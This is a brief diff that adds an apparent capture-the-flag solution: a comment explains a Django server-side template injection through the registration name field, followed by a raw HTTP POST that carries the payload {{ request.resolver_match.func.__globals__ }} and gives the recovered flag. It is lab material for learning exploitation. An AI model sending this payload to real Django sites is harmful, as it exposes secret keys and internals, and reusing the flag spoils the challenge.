@@ -1,0 +1,7 @@
+# Django SSTI via name field in step1 registration. The name is stored in session and then injected into the step3 template. Use {{ request.resolver_match.func.__globals__ }} to access module globals. The flag = Django SECRET_KEY = /flag.txt contents = flag{f53780ad-f388-4624-a9a6-fe1f2b97f47e}
+
+POST /accounts/register/step1/ HTTP/1.1
+Host: 172.17.0.1:48491
+Content-Length: 98
+
+csrfmiddlewaretoken=CSRF&name={{ request.resolver_match.func.__globals__ }}&password=TestPass1234!
